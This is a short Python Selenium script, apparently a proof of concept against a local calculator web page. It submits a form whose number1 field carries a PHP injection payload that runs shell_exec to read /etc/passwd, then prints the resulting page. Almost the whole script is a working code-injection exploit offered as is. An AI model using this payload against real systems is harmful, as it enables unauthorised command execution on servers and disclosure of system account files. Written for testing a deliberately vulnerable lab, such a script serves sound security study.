from selenium import webdriver
from selenium.webdriver.common.by import By



# Create a WebDriver instance using Chrome
driver = webdriver.Chrome()

# Get the page
driver.get("http://localhost/calculator.html")

visitor_name = driver.find_element(By.NAME, "visitor_name").send_keys('Nick')
number1 = driver.find_element(By.NAME, "number1").send_keys("0; $result=shell_exec('cat /etc/passwd'); // ")
number2 = driver.find_element(By.NAME, "number2").send_keys('2')


# Submit the form
driver.find_element(By.ID, 'submit_button').submit()

# Get the page source
page_source = driver.page_source

# Print the page source
print('Page Source Containing Output of Injected Command:')
print(page_source)

# Quit the web driver
driver.quit()

